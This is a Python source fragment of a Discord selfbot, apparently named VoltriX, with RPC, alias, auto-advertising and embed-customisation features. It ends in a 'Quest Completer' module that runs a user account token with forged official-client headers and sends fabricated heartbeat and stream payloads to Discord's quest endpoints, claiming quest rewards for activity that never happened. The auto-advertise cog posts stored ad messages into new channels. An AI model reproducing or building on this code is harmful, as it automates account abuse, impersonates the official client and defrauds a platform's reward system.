    @rpc_group.command(name="button2_url")
    async def rpc_button2_url(self, ctx):
        try:
            await ctx.message.delete()
        except:
            pass

        prompt_msg = await send(ctx, "RPC Config", "✏️ Enter Button 2 URL:")
        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel

        try:
            msg = await self.bot.wait_for("message", check=check, timeout=60.0)
            val = msg.content.strip()
            try:
                await msg.delete()
            except:
                pass
            try:
                await prompt_msg.delete()
            except:
                pass

            with open("config/rpc_config.json", "r") as f:
                config = json.load(f)

            config["buttons"][1]["url"] = val

            with open("config/rpc_config.json", "w") as f:
                json.dump(config, f, indent=4)

            await self.update_rpc()
            await send(ctx, "RPC Updated", f"✅ RPC **Button 2 URL** has been updated to: `{val}`", delete_after=5)

        except asyncio.TimeoutError:
            try:
                await prompt_msg.delete()
            except:
                pass
            await send(ctx, "RPC Timeout", "❌ Configuration timed out.", delete_after=5)

    @rpc_group.command(name="party")
    async def rpc_party(self, ctx, option: str = None):
        try:
            await ctx.message.delete()
        except:
            pass

        if not option:
            return await send(ctx, "RPC Party Error", "❌ Please specify an option: `enable`, `disable`, `current`, or `max`.", delete_after=5)

        option = option.lower().strip()
        with open("config/rpc_config.json", "r") as f:
            config = json.load(f)

        if option == "enable":
            config["party"]["enabled"] = True
            with open("config/rpc_config.json", "w") as f:
                json.dump(config, f, indent=4)
            await self.update_rpc()
            await send(ctx, "RPC Updated", "✅ RPC **party** status has been enabled!", delete_after=5)

        elif option == "disable":
            config["party"]["enabled"] = False
            with open("config/rpc_config.json", "w") as f:
                json.dump(config, f, indent=4)
            await self.update_rpc()
            await send(ctx, "RPC Updated", "❌ RPC **party** status has been disabled!", delete_after=5)

        elif option in ("current", "max"):
            prompt_msg = await send(ctx, "RPC Config", f"✏️ Enter party **{option}** value:")
            def check(m):
                return m.author == ctx.author and m.channel == ctx.channel

            try:
                msg = await self.bot.wait_for("message", check=check, timeout=60.0)
                val = msg.content.strip()
                try:
                    await msg.delete()
                except:
                    pass
                try:
                    await prompt_msg.delete()
                except:
                    pass

                try:
                    int_val = int(val)
                except ValueError:
                    return await send(ctx, "RPC Error", f"❌ Value must be an integer: `{val}`", delete_after=5)

                with open("config/rpc_config.json", "r") as f:
                    config = json.load(f)

                config["party"][option] = int_val

                with open("config/rpc_config.json", "w") as f:
                    json.dump(config, f, indent=4)

                await self.update_rpc()
                await send(ctx, "RPC Updated", f"✅ RPC **party {option}** has been updated to: `{int_val}`", delete_after=5)

            except asyncio.TimeoutError:
                try:
                    await prompt_msg.delete()
                except:
                    pass
                await send(ctx, "RPC Timeout", "❌ Configuration timed out.", delete_after=5)
        else:
            await send(ctx, "RPC Party Error", "❌ Invalid option. Use `enable`, `disable`, `current`, or `max`.", delete_after=5)

class AliasCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.aliases = load_aliases()
        self.apply_aliases()
        
    def apply_aliases(self):
        for command_name, alias_list in self.aliases.items():
            original_command = self.bot.get_command(command_name)
            if original_command:
                for alias in alias_list:
                    if not self.bot.get_command(alias):
                        self.bot.add_command(commands.Command(
                            original_command.callback,
                            name=alias,
                            aliases=[] 
                        ))

    @commands.command(aliases=['alias+','aliasadd'])
    async def addalias(self, ctx, command_name: str, new_alias: str):
        command = self.bot.get_command(command_name)
        if not command:
            return await senderror(ctx, "Invalid Command", f"`{command_name}` doesn't exist.")
        if self.bot.get_command(new_alias):
            return await senderror(ctx, "Alias Exists", f"`{new_alias}` is already a command or alias.")
        if command_name not in self.aliases:
            self.aliases[command_name] = []
        if new_alias in self.aliases[command_name]:
            return await senderror(ctx, "Duplicate Alias", f"`{new_alias}` already exists for `{command_name}`.")
        self.aliases[command_name].append(new_alias)
        save_aliases(self.aliases)
        self.bot.add_command(commands.Command(
            command.callback,
            name=new_alias,
            aliases=[]
        ))
        await send(ctx, "Alias Added", f"`{new_alias}` is now an alias for `{command_name}`.")

    @commands.command(aliases=['remalias','aliasremove','aliasrem','alias-'])
    async def removealias(self, ctx, alias: str):
        found = False
        for command_name, alias_list in self.aliases.items():
            if alias in alias_list:
                alias_list.remove(alias)
                found = True
                if command := self.bot.get_command(alias):
                    self.bot.remove_command(alias)
                break

        if not found:
            return await senderror(ctx, "Alias Not Found", f"`{alias}` is not a known alias.")
        self.aliases = {cmd: als for cmd, als in self.aliases.items() if als}
        save_aliases(self.aliases)

        await send(ctx, "Alias Removed", f"`{alias}` has been removed successfully.")


ADS_FILE = "database/ads.json"

def load_ads():
    default_data = {"triggers": {}, "guilds": [], "aliases": {}}

    if not os.path.exists(ADS_FILE):
        with open(ADS_FILE, "w") as f:
            json.dump(default_data, f, indent=4)
        return default_data

    try:
        with open(ADS_FILE, "r") as f:
            data = json.load(f)
    except json.JSONDecodeError:
        data = default_data

    # Ensure all keys exist
    for key in default_data:
        if key not in data:
            data[key] = default_data[key]

    save_ads(data) 
    return data


def save_ads(data):
    with open(ADS_FILE, "w") as f:
        json.dump(data, f, indent=4)

class AutoAdvertise(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.ads = load_ads()

    @commands.command()
    async def autoad(self, ctx):
        await ctx.message.delete()
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        description = (
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:BadgeDeveloper:1290693804013129768> **`[REQUIRED] | <OPTIONAL>`** <a:Bot:1336670517486161951>\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:Titanz:1281243482811400324> | **Add AutoAD** **:** **`{prefix}autoad+ [trigger] [msg]`**\n"
            f"<:Titanz:1281243482811400324> | **Remove AutoAD** **:** **`{prefix}autoad- [trigger]`**\n"            
            f"<:Titanz:1281243482811400324> | **Whitelist guilds** **:** **`{prefix}adguild+ [ID]`**\n"  
            f"<:Titanz:1281243482811400324> | **Unwhitelist guilds** **:** **`{prefix}adguild- [ID]`**\n"
            f"<:Titanz:1281243482811400324> | **Add AdAlias** **:** **`{prefix}adalias+ [trigger] [alias]`**\n"            
            f"<:Titanz:1281243482811400324> | **Remove AdAlias** **:** **`{prefix}adalias- [alias]`**\n"                        
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>"
        )
        await send(ctx, "<:devs:1290693770567749652>__Auto ADs Commands__<:Titanz:1281243489635405827>", description)
    @commands.command(aliases=['autoad+'])
    async def autoadadd(self, ctx, trigger: str, *, message: str):
        await ctx.message.delete()
        if trigger in self.ads["triggers"]:
            return await senderror(ctx, "Already Exists", f"Trigger `{trigger}` already has a message.")
        self.ads["triggers"][trigger] = message
        save_ads(self.ads)
        await send(ctx, "Ad Added", f"Trigger `{trigger}` now responds with:\n```\n{message}\n```")

    @commands.command(aliases=['autoad-'])
    async def autoadrem(self, ctx, trigger: str):
        await ctx.message.delete()        
        if trigger not in self.ads["triggers"]:
            return await senderror(ctx, "Not Found", f"No ad exists with trigger `{trigger}`.")
        del self.ads["triggers"][trigger]
        self.ads["aliases"] = {k: v for k, v in self.ads["aliases"].items() if v != trigger}
        save_ads(self.ads)
        await send(ctx, "Ad Removed", f"Trigger `{trigger}` removed.")

    @commands.command(aliases=["adguild+", "guildadd"])
    async def adguildadd(self, ctx, guild_id: int):
        await ctx.message.delete()        
        if guild_id in self.ads["guilds"]:
            return await senderror(ctx, "Already Exists", f"Guild `{guild_id}` is already added.")
        self.ads["guilds"].append(guild_id)
        save_ads(self.ads)
        await send(ctx, "Guild Added", f"Guild `{guild_id}` added to the allowlist.")

    @commands.command(aliases=["delguild","remguild",'adguild-'])
    async def adguildrem(self, ctx, guild_id: int):
        await ctx.message.delete()        
        if guild_id not in self.ads["guilds"]:
            return await senderror(ctx, "Not Found", f"Guild `{guild_id}` is not in the list.")
        self.ads["guilds"].remove(guild_id)
        save_ads(self.ads)
        await send(ctx, "Guild Removed", f"Guild `{guild_id}` removed from the allowlist.")

    @commands.command(aliases=['adalias+','aliasad+'])
    async def adaliasadd(self, ctx, trigger: str, alias: str):
        await ctx.message.delete()        
        if trigger not in self.ads["triggers"]:
            return await senderror(ctx, "Invalid Trigger", f"Trigger `{trigger}` doesn't exist.")
        self.ads["aliases"][alias] = trigger
        save_ads(self.ads)
        await send(ctx, "Alias Added", f"Alias `{alias}` will now trigger ad `{trigger}`.")

    @commands.command(aliases=["aliasdel", "removead", "adalias-"])
    async def adaliasrem(self, ctx, alias: str):
        await ctx.message.delete()        
        if alias not in self.ads["aliases"]:
            return await senderror(ctx, "Alias Not Found", f"`{alias}` is not an existing alias.")
        del self.ads["aliases"][alias]
        save_ads(self.ads)
        await send(ctx, "Alias Removed", f"Alias `{alias}` removed.")

    @commands.Cog.listener()
    async def on_guild_channel_create(self, channel):
        if not isinstance(channel, discord.TextChannel):
            return
        if channel.guild.id not in self.ads["guilds"]:
            return

        channel_name = channel.name
        real_trigger = None

        if channel_name in self.ads["triggers"]:
            real_trigger = channel_name
        elif channel_name in self.ads["aliases"]:
            real_trigger = self.ads["aliases"][channel_name]

        if real_trigger:
            message = self.ads["triggers"].get(real_trigger)
            try:
                await channel.send(message)
            except:
                pass


# Shared references for Selfapp mode (Mode 4)
import builtins
if not hasattr(builtins, "selfapp_bot_client"):
    builtins.selfapp_bot_client = None
if not hasattr(builtins, "selfapp_command_id"):
    builtins.selfapp_command_id = None
if not hasattr(builtins, "selfapp_command_version"):
    builtins.selfapp_command_version = None

selfapp_bot_client = getattr(builtins, "selfapp_bot_client", None)
selfapp_command_id = getattr(builtins, "selfapp_command_id", None)
selfapp_command_version = getattr(builtins, "selfapp_command_version", None)

def ensure_selfapp_config():
    if not os.path.exists("config/selfapp_config.json"):
        config = {
            "title": "{title}",
            "author_name": "{selfbot_name}",
            "author_icon_url": "{useravatar}",
            "thumbnail_url": "",
            "image_url": "",
            "footer_text": "requested by {user} | {time}",
            "footer_icon_url": "{useravatar}",
            "hex_color": "#ffffff"
        }
        try:
            with open("config/selfapp_config.json", "w") as f:
                json.dump(config, f, indent=4)
        except Exception as e:
            print(f"Error creating config/selfapp_config.json: {e}")

def build_selfapp_embed(header, description, image=None, thumbnail=None, footer=None):
    ensure_selfapp_config()
    try:
        with open("config/selfapp_config.json", "r") as f:
            embed_config = json.load(f)
    except:
        embed_config = {}

    def fmt(txt):
        if not txt:
            return ""
        user = voltrix.user
        from datetime import datetime
        now = datetime.now()
        
        placeholders = {
            "{user}": user.name if user else "user",
            "{time}": now.strftime("%I:%M %p"),
            "{date}": now.strftime("%d-%m-%Y"),
            "{selfbot_name}": user.name if user else "VoltriX",
            "{title}": str(header or ""),
            "{footer_text}": str(footer or ""),
            "{useravatar}": str(user.display_avatar.url) if (user and user.avatar) else ""
        }
        
        for p, v in placeholders.items():
            txt = txt.replace(p, v)
        return txt

    color_hex = embed_config.get("hex_color", "#ffffff")
    try:
        color = int(color_hex.lstrip("#"), 16)
    except:
        color = 0xffffff

    embed_json = {
        "description": str(description or ""),
        "color": color
    }
    
    title_val = str(header).strip() if header else fmt(embed_config.get("title", ""))
    if title_val:
        embed_json["title"] = title_val

    auth_name = fmt(embed_config.get("author_name"))
    auth_icon = fmt(embed_config.get("author_icon_url"))
    if auth_name or auth_icon:
        embed_json["author"] = {}
        if auth_name:
            embed_json["author"]["name"] = auth_name
        if auth_icon:
            embed_json["author"]["icon_url"] = auth_icon

    thumb_url = fmt(embed_config.get("thumbnail_url"))
    if thumb_url:
        embed_json["thumbnail"] = {"url": thumb_url}
    elif thumbnail:
        embed_json["thumbnail"] = {"url": thumbnail}

    img_url = fmt(embed_config.get("image_url"))
    if img_url:
        embed_json["image"] = {"url": img_url}
    elif image:
        embed_json["image"] = {"url": image}

    footer_text = fmt(embed_config.get("footer_text"))
    footer_icon = fmt(embed_config.get("footer_icon_url"))
    if footer_text or footer_icon:
        embed_json["footer"] = {}
        if footer_text:
            embed_json["footer"]["text"] = footer_text
        if footer_icon:
            embed_json["footer"]["icon_url"] = footer_icon

    return embed_json

def make_calculator_components(screen_value):
    rows = []
    rows.append({
        "type": 1,
        "components": [
            {"type": 2, "style": 2, "label": "1", "custom_id": "calc_1"},
            {"type": 2, "style": 2, "label": "2", "custom_id": "calc_2"},
            {"type": 2, "style": 2, "label": "3", "custom_id": "calc_3"},
            {"type": 2, "style": 1, "label": "+", "custom_id": "calc_add"}
        ]
    })
    rows.append({
        "type": 1,
        "components": [
            {"type": 2, "style": 2, "label": "4", "custom_id": "calc_4"},
            {"type": 2, "style": 2, "label": "5", "custom_id": "calc_5"},
            {"type": 2, "style": 2, "label": "6", "custom_id": "calc_6"},
            {"type": 2, "style": 1, "label": "-", "custom_id": "calc_sub"}
        ]
    })
    rows.append({
        "type": 1,
        "components": [
            {"type": 2, "style": 2, "label": "7", "custom_id": "calc_7"},
            {"type": 2, "style": 2, "label": "8", "custom_id": "calc_8"},
            {"type": 2, "style": 2, "label": "9", "custom_id": "calc_9"},
            {"type": 2, "style": 1, "label": "*", "custom_id": "calc_mul"}
        ]
    })
    rows.append({
        "type": 1,
        "components": [
            {"type": 2, "style": 4, "label": "C", "custom_id": "calc_clear"},
            {"type": 2, "style": 2, "label": "0", "custom_id": "calc_0"},
            {"type": 2, "style": 3, "label": "=", "custom_id": "calc_equal"},
            {"type": 2, "style": 1, "label": "/", "custom_id": "calc_div"}
        ]
    })
    return rows

def make_ttt_components(board, game_over=False):
    rows = []
    for r in range(3):
        row_components = []
        for c in range(3):
            val = board[r][c]
            style = 2  # Grey
            if val == "X":
                style = 1  # Blurple
            elif val == "O":
                style = 3  # Green
            row_components.append({
                "type": 2,
                "style": style,
                "label": val if val != " " else " ",
                "custom_id": f"ttt_{r}_{c}",
                "disabled": game_over or (val != " ")
            })
        rows.append({
            "type": 1,
            "components": row_components
        })
    return rows

def make_preview_embed_json(embed_config):
    def fmt(txt):
        if not txt:
            return ""
        user = voltrix.user
        from datetime import datetime
        now = datetime.now()
        placeholders = {
            "{user}": user.name if user else "user",
            "{time}": now.strftime("%I:%M %p"),
            "{date}": now.strftime("%d-%m-%Y"),
            "{selfbot_name}": user.name if user else "VoltriX",
            "{title}": "Preview Title",
            "{footer_text}": "Preview Footer",
            "{useravatar}": str(user.display_avatar.url) if (user and user.avatar) else ""
        }
        for p, v in placeholders.items():
            txt = txt.replace(p, v)
        return txt

    color_hex = embed_config.get("hex_color", "#ffffff")
    try:
        color = int(color_hex.lstrip("#"), 16)
    except:
        color = 0xffffff

    embed_json = {
        "description": "This is a preview of your custom command response description.",
        "color": color
    }

    title_val = fmt(embed_config.get("title"))
    if title_val:
        embed_json["title"] = title_val

    auth_name = fmt(embed_config.get("author_name"))
    auth_icon = fmt(embed_config.get("author_icon_url"))
    if auth_name or auth_icon:
        embed_json["author"] = {}
        if auth_name:
            embed_json["author"]["name"] = auth_name
        if auth_icon:
            embed_json["author"]["icon_url"] = auth_icon

    thumb_url = fmt(embed_config.get("thumbnail_url"))
    if thumb_url:
        embed_json["thumbnail"] = {"url": thumb_url}

    img_url = fmt(embed_config.get("image_url"))
    if img_url:
        embed_json["image"] = {"url": img_url}

    footer_text = fmt(embed_config.get("footer_text"))
    footer_icon = fmt(embed_config.get("footer_icon_url"))
    if footer_text or footer_icon:
        embed_json["footer"] = {}
        if footer_text:
            embed_json["footer"]["text"] = footer_text
        if footer_icon:
            embed_json["footer"]["icon_url"] = footer_icon

    return embed_json

def make_select_menu_components():
    return [
        {
            "type": 1,
            "components": [
                {
                    "type": 3,
                    "custom_id": "selfapp_customize_select",
                    "placeholder": "Select a field to customize...",
                    "options": [
                        {"label": "Title", "value": "title", "description": "Customize embed title"},
                        {"label": "Author Name", "value": "author_name", "description": "Customize author display name"},
                        {"label": "Author Icon URL", "value": "author_icon_url", "description": "Customize author icon URL"},
                        {"label": "Thumbnail URL", "value": "thumbnail_url", "description": "Customize thumbnail image URL"},
                        {"label": "Image URL", "value": "image_url", "description": "Customize large image URL"},
                        {"label": "Footer Text", "value": "footer_text", "description": "Customize footer display text"},
                        {"label": "Footer Icon URL", "value": "footer_icon_url", "description": "Customize footer icon URL"},
                        {"label": "Hex Color (#RRGGBB)", "value": "hex_color", "description": "Customize embed sidebar color"}
                    ]
                }
            ]
        }
    ]

def make_modal_payload(key_name, current_val):
    labels = {
        "title": "Title",
        "author_name": "Author Name",
        "author_icon_url": "Author Icon URL",
        "thumbnail_url": "Thumbnail URL",
        "image_url": "Image URL",
        "footer_text": "Footer Text",
        "footer_icon_url": "Footer Icon URL",
        "hex_color": "Hex Color (#RRGGBB)"
    }
    label = labels.get(key_name, key_name)
    style = 2 if key_name in ("footer_text", "title", "author_name") else 1

    return {
        "type": 9,
        "data": {
            "title": f"Customize {label}",
            "custom_id": f"selfapp_customize_modal:{key_name}",
            "components": [
                {
                    "type": 1,
                    "components": [
                        {
                            "type": 4,
                            "custom_id": "value_input",
                            "label": label,
                            "style": style,
                            "value": str(current_val or ""),
                            "placeholder": "Type value (placeholders like {user}, {time} are supported)",
                            "required": False
                        }
                    ]
                }
            ]
        }
    }

# ==========================================================
# QUEST MODULE & HELPERS (Voltrix Quest Completer)
# ==========================================================
import configparser
import os
import datetime as dt

UI_EMOJIS = {}
TASK_EMOJIS = {}

def load_emojis():
    global UI_EMOJIS, TASK_EMOJIS
    config = configparser.ConfigParser()
    if os.path.exists("emoji.ini"):
        try:
            config.read("emoji.ini")
            if "UI_EMOJIS" in config:
                UI_EMOJIS.update({k: v for k, v in config["UI_EMOJIS"].items()})
            if "TASK_EMOJIS" in config:
                TASK_EMOJIS.update({k: v for k, v in config["TASK_EMOJIS"].items()})
        except Exception as e:
            print(f"[Quest] Error reading emoji.ini: {e}")
    
    defaults = {
        "header": "<:quest:1533405689706446908>",
        "spark": "<:sparklehearts:1533405703199395982>",
        "reward": "<:giftbox:1533405696555745361>",
        "game": "<:gdc_game:1533405710035976233>",
        "progress": "<a:Loading:1533405724166590465>",
        "time": "<:uptime:1533405731284320317>",
        "mode": "<:boosters:1533405737848537249>",
        "logs": "<:rules:1533405745088041132>",
        "summary": "<:note:1533405752583131326>",
        "overview": "<:diamond:1533405759700733972>",
        "art": "<a:decorations_lua:1533405766872993822>",
        "completed": "<a:ds_Tick:1533405773923881020>",
        "running": "<a:loading:1533405781922287686>",
        "recovering": "<a:reload2:1533405791816646777>",
        "failed": "<:SW_cross:1533405798619680858>",
        "stopped": "<:Offline:1533405804634443947>",
        "autoquest": "<a:loading:1533405781922287686>",
        "dm": "📩",
        "notify": "🔔",
    }
    for k, v in defaults.items():
        if k not in UI_EMOJIS:
            UI_EMOJIS[k] = v
            
    task_defaults = {
        "WATCH_VIDEO_ON_MOBILE": "<:mobile:1533405666457161869>",
        "WATCH_VIDEO": "<:ol_streaming:1533405674296573962>",
        "STREAM_ON_DESKTOP": "<:ol_streaming:1533405674296573962>",
        "PLAY_ON_DESKTOP": "<:ol_streaming:1533405674296573962>",
        "PLAY_ON_DESKTOP_V2": "<:ol_streaming:1533405674296573962>",
        "PLAY_ACTIVITY": "<:pc:1533405682416746598>",
    }
    for k, v in task_defaults.items():
        if k not in TASK_EMOJIS:
            TASK_EMOJIS[k] = v

load_emojis()

class APIError(Exception):
    def __init__(self, status: int, body=None, text: str = ""):
        super().__init__(f"Discord API error {status}")
        self.status = status
        self.body = body or {}
        self.text = text

def clean_token(token: str | None):
    if not token:
        return None
    return token.strip().strip('"').strip("'")

def decode_token_user_id(token: str | None):
    token = clean_token(token)
    if not token or "." not in token:
        return None
    first = token.split(".", 1)[0]
    import base64
    padding = "=" * (-len(first) % 4)
    try:
        return base64.b64decode(first + padding).decode("utf-8")
    except Exception:
        return None

# Headers builder
USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9044 Chrome/120.0.6099.291 Electron/28.2.10 Safari/537.36'
CLIENT_BUILD_NUMBER = 971383

def get_super_properties():
    from uuid import uuid4
    return {
        "os": "Windows",
        "browser": "Chrome",
        "device": "",
        "system_locale": "en",
        "has_client_mods": False,
        "browser_user_agent": USER_AGENT,
        "browser_version": "142.0.0.0",
        "os_version": "10",
        "referrer": "",
        "referring_domain": "",
        "referrer_current": "https://discord.com/",
        "referring_domain_current": "discord.com",
        "release_channel": "stable",
        "client_launch_id": str(uuid4()),
        "client_build_number": CLIENT_BUILD_NUMBER,
        "client_event_source": None,
        "launch_signature": str(uuid4()),
        "client_heartbeat_session_id": str(uuid4()),
        "client_app_state": "focused",
    }

def get_headers(token):
    import base64
    super_props = base64.b64encode(json.dumps(get_super_properties()).encode()).decode()
    return {
        'authorization': token,
        'accept': '*/*',
        'accept-language': 'en,en-US;q=0.9,ar;q=0.8',
        'content-type': 'application/json',
        'user-agent': USER_AGENT,
        'x-super-properties': super_props,
        'x-discord-locale': 'en-US',
        'x-discord-timezone': 'Africa/Algiers',
        'x-debug-options': 'bugReporterEnabled',
        'origin': 'https://discord.com',
        'referer': 'https://discord.com/quest-home',
        'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'priority': 'u=1, i',
    }

async def request(session: aiohttp.ClientSession, method: str, url: str, headers=None, json_body=None):
    async with session.request(method, url, headers=headers, json=json_body) as resp:
        text = await resp.text()
        body = {}
        if text:
            try:
                body = json.loads(text)
            except json.JSONDecodeError:
                body = {"raw": text}
        if resp.status >= 400:
            raise APIError(resp.status, body, text)
        return body

async def request_with_retry(session: aiohttp.ClientSession, method: str, url: str, headers=None, json_body=None, retries: int = 4):
    last_error = None
    for attempt in range(retries):
        try:
            return await request(session, method, url, headers=headers, json_body=json_body)
        except APIError as exc:
            last_error = exc
            if exc.status == 429 or exc.status >= 500:
                retry_after = 0.8 * (attempt + 1)
                if isinstance(exc.body, dict):
                    try:
                        retry_after = float(exc.body.get("retry_after", retry_after))
                    except:
                        pass
                await asyncio.sleep(retry_after)
                continue
            raise
    raise last_error

SUPPORTED_TASKS = (
    "WATCH_VIDEO",
    "WATCH_VIDEO_ON_MOBILE",
    "PLAY_ON_DESKTOP",
    "PLAY_ON_DESKTOP_V2",
    "PLAY_ACTIVITY",
    "STREAM_ON_DESKTOP",
)

class QuestRecord:
    def __init__(self, data):
        self.data = data
        self.selected_task = self._pick_task()
        self.target = float(self.tasks.get(self.selected_task, {}).get("target", 0) or 0)

    @property
    def id(self):
        return str(self.data.get("id"))

    @property
    def config(self):
        return self.data.get("config", {})

    @property
    def messages(self):
        return self.config.get("messages", {})

    @property
    def user_status(self):
        return self.data.get("user_status") or {}

    @property
    def tasks(self):
        task_config = (
            self.config.get("task_config_v2")
            or self.config.get("task_config")
            or self.config.get("taskConfigV2")
            or self.config.get("taskConfig")
            or {}
        )
        return task_config.get("tasks", {})

    @property
    def name(self):
        return (
            self.messages.get("quest_name")
            or self.messages.get("questName")
            or self.messages.get("game_title")
            or "Unknown Quest"
        )

    @property
    def game_title(self):
        return self.messages.get("game_title") or self.messages.get("gameTitle") or "Unknown Game"

    @property
    def image_url(self):
        assets = self.config.get("assets", {})
        for key in ("quest_bar_hero", "hero"):
            asset = assets.get(key)
            if asset:
                if asset.startswith("quests/"):
                    return f"https://cdn.discordapp.com/{asset}"
                return f"https://cdn.discordapp.com/quests/{self.id}/{asset}"
        return None

    @property
    def reward_name(self):
        rewards = self.config.get("rewards_config", {}).get("rewards", [])
        if rewards:
            messages = rewards[0].get("messages", {})
            return messages.get("name") or messages.get("name_with_article") or "Unknown Reward"
        return "Unknown Reward"

    @property
    def app_id(self):
        return self.config.get("application", {}).get("id")

    @property
    def expires_at(self):
        return self.config.get("expires_at") or self.config.get("expiresAt")

    def expires_relative(self):
        expires_at = self.expires_at
        if not expires_at:
            return "Unknown"
        try:
            parsed = dt.datetime.fromisoformat(expires_at.replace("Z", "+00:00"))
            return f"<t:{int(parsed.timestamp())}:R>"
        except:
            return "Unknown"

    def is_expired(self):
        expires_at = self.expires_at
        if not expires_at:
            return False
        try:
            parsed = dt.datetime.fromisoformat(expires_at.replace("Z", "+00:00"))
            return dt.datetime.now(dt.timezone.utc) > parsed
        except:
            return False

    def is_completed(self):
        return bool(self.user_status.get("completed_at") or self.user_status.get("completedAt"))

    def is_enrolled(self):
        return bool(self.user_status.get("enrolled_at"))

    def is_supported(self):
        return self.selected_task in SUPPORTED_TASKS

    def progress_value(self):
        progress = self.user_status.get("progress", {})
        task_progress = progress.get(self.selected_task, {})
        if task_progress:
            return float(task_progress.get("value", 0) or 0)
        return 0.0

    def progress_percent(self):
        if not self.target:
            return 0
        return min(100, int((self.progress_value() / self.target) * 100))

    def _pick_task(self):
        for task_name in SUPPORTED_TASKS:
            if task_name in self.tasks:
                return task_name
        return next(iter(self.tasks.keys()), "UNKNOWN")

class QuestService:
    def __init__(self, token: str, speed_mode: str = "fast"):
        self.token = clean_token(token)
        self.speed_mode = speed_mode
        self.user_id = decode_token_user_id(token)
        self.headers = get_headers(self.token)

    async def fetch_quests(self, session: aiohttp.ClientSession):
        try:
            payload = await request_with_retry(
                session,
                "GET",
                "https://discord.com/api/v9/quests/@me",
                headers=self.headers,
            )
            quests = []
            for raw in payload.get("quests", []):
                quest = QuestRecord(raw)
                if quest.is_expired():
                    continue
                quests.append(quest)
            return quests
        except Exception as e:
            print(f"[QuestService] Error fetching quests: {e}")
            return []

    async def refresh_quest(self, session: aiohttp.ClientSession, quest_id: str):
        quests = await self.fetch_quests(session)
        for quest in quests:
            if quest.id == quest_id:
                return quest
        return None

    async def get_user_status(self, session: aiohttp.ClientSession, quest_id: str):
        return await request_with_retry(
            session,
            "GET",
            f"https://discord.com/api/v9/quests/{quest_id}/user-status",
            headers=self.headers,
        )

    async def enroll(self, session: aiohttp.ClientSession, quest: QuestRecord):
        payload = await request_with_retry(
            session,
            "POST",
            f"https://discord.com/api/v9/quests/{quest.id}/enroll",
            headers=self.headers,
            json_body={"location": 11, "is_targeted": False, "metadata_raw": None},
        )
        if payload:
            quest.data["user_status"] = payload
        return True

    async def run_quest(self, session: aiohttp.ClientSession, quest: QuestRecord, on_update=None):
        while True:
            try:
                if not quest.is_enrolled():
                    await self.enroll(session, quest)
                    await self._emit(on_update, quest, "Enroll success", status="enrolled")

                if not quest.is_supported():
                    await self._emit(on_update, quest, "Unsupported quest", status="unsupported")
                    return {"status": "unsupported", "quest": quest}

                result = await self._run_solver(session, quest, on_update)
                if result["status"] == "completed":
                    return result

                fresh = await self.refresh_quest(session, quest.id)
                if fresh and fresh.is_completed():
                    await self._emit(on_update, fresh, "Completed", percent=100, status="completed")
                    return {"status": "completed", "quest": fresh, "percent": 100}
                if fresh:
                    quest = fresh

                await self._emit(
                    on_update,
                    quest,
                    f"Recovering -> {quest.name} from {quest.progress_percent()}%",
                    percent=quest.progress_percent(),
                    status="recovering",
                )
                await asyncio.sleep(5.0)
            except APIError as exc:
                if exc.status == 404:
                    fresh = await self.refresh_quest(session, quest.id)
                    if fresh and fresh.is_completed():
                        await self._emit(on_update, fresh, "Completed", percent=100, status="completed")
                        return {"status": "completed", "quest": fresh, "percent": 100}
                    if fresh:
                        quest = fresh
                    await self._emit(
                        on_update,
                        quest,
                        f"API 404 -> resuming from {quest.progress_percent()}%",
                        percent=quest.progress_percent(),
                        status="recovering",
                    )
                    await asyncio.sleep(5.0)
                    continue

                if exc.status in (401, 403):
                    message = f"API error {exc.status}"
                    await self._emit(on_update, quest, message, status="failed_unrecoverable")
                    return {"status": "failed_unrecoverable", "quest": quest, "percent": quest.progress_percent(), "reason": message}

                await asyncio.sleep(5.0)
            except asyncio.CancelledError:
                raise
            except Exception as exc:
                await asyncio.sleep(5.0)

    async def _run_solver(self, session: aiohttp.ClientSession, quest: QuestRecord, on_update=None):
        task = quest.selected_task
        await self._emit(on_update, quest, "Solver active", status="running")
        if task in ("WATCH_VIDEO", "WATCH_VIDEO_ON_MOBILE"):
            return await self._run_video(session, quest, on_update)
        if task in ("PLAY_ON_DESKTOP", "PLAY_ON_DESKTOP_V2"):
            payloads = [
                {"stream_key": f"call:{quest.id}:1", "terminal": False},
            ]
            if quest.app_id:
                payloads.append({"application_id": quest.app_id, "terminal": False})
            return await self._run_heartbeat(session, quest, payloads, on_update)
        if task == "PLAY_ACTIVITY":
            user_key = self.user_id or quest.id
            payloads = [
                {"stream_key": f"call:{user_key}:1", "terminal": False},
                {"stream_key": f"call:{quest.id}:1", "terminal": False},
            ]
